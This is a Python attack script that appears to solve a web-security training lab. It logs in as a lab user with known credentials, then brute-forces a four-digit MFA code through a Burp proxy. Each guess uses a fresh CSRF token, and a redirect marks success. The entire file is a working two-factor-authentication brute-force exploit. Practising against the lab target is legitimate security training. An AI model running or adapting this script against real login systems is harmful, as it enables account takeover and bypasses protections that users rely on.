from bs4 import BeautifulSoup
import requests

def initialize_settings():
    """Initialize and return the global settings."""
    return {
        "base_url": "https://0a82007404f6e1098082ad7d0059008d.web-security-academy.net",
        "login_endpoint": "/login",
        "login2_endpoint": "/login2",
        "target_username": "carlos",
        "target_password": "montoya",
        "burp_proxy": {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        "ca_cert_path": "certs/burp_cacert_chain.pem",
        "session": requests.Session(),
    }


def login(settings):
    """Perform the initial login to get a valid session cookie."""
    session = settings["session"]
    login_url = f"{settings['base_url']}{settings['login_endpoint']}"
    payload = {
        "username": settings["target_username"],
        "password": settings["target_password"],
    }
    try:
        response = session.post(
            login_url,
            data=payload,
            proxies=settings["burp_proxy"],
            verify=settings["ca_cert_path"],
        )
        response.raise_for_status()
        if "Your username or password is incorrect" in response.text:
            print("Login failed. Check username and password.")
            return False
        print("Login successful.")
        return True
    except requests.RequestException as e:
        print(f"Login request failed: {e}")
        return False


def get_csrf_token(settings):
    """Retrieve CSRF token from the /login2 page."""
    session = settings["session"]
    login2_url = f"{settings['base_url']}{settings['login2_endpoint']}"
    try:
        response = session.get(
            login2_url,
            proxies=settings["burp_proxy"],
            verify=settings["ca_cert_path"],
        )
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrf"})["value"]
        print(f"CSRF token retrieved: {csrf_token}")
        return csrf_token
    except Exception as e:
        print(f"Error retrieving CSRF token: {e}")
        return None


def test_mfa_code(settings, csrf_token, code):
    """Test a single MFA code for verification."""
    session = settings["session"]
    login2_url = f"{settings['base_url']}{settings['login2_endpoint']}"
    payload = {
        "csrf": csrf_token,
        "mfa-code": code,
    }
    try:
        response = session.post(
            login2_url,
            data=payload,
            proxies=settings["burp_proxy"],
            verify=settings["ca_cert_path"],
            allow_redirects=False,  # Don't follow redirects for 302 detection
        )
        if response.status_code == 302:  # Typically indicates a successful login
            print(f"Valid MFA code found: {code}")
            return True
        elif "Incorrect security code" in response.text:
            print(f"Incorrect MFA code: {code}")
        return False
    except requests.RequestException as e:
        print(f"Request failed for MFA code {code}: {e}")
        return False


def brute_force_mfa(settings):
    """Brute-force the MFA codes."""
    if not login(settings):
        print("Login failed. Cannot proceed with MFA brute force.")
        return

    for code in range(10000):  # Generate codes from 0000 to 9999
        csrf_token = get_csrf_token(settings)
        if not csrf_token:
            print("Failed to retrieve CSRF token. Aborting brute force.")
            break

        code_str = f"{code:04d}"  # Format the code as a 4-digit string
        if test_mfa_code(settings, csrf_token, code_str):
            print(f"Success! MFA code is: {code_str}")
            break
    else:
        print("Failed to brute-force MFA code.")


if __name__ == "__main__":
    settings = initialize_settings()
    brute_force_mfa(settings)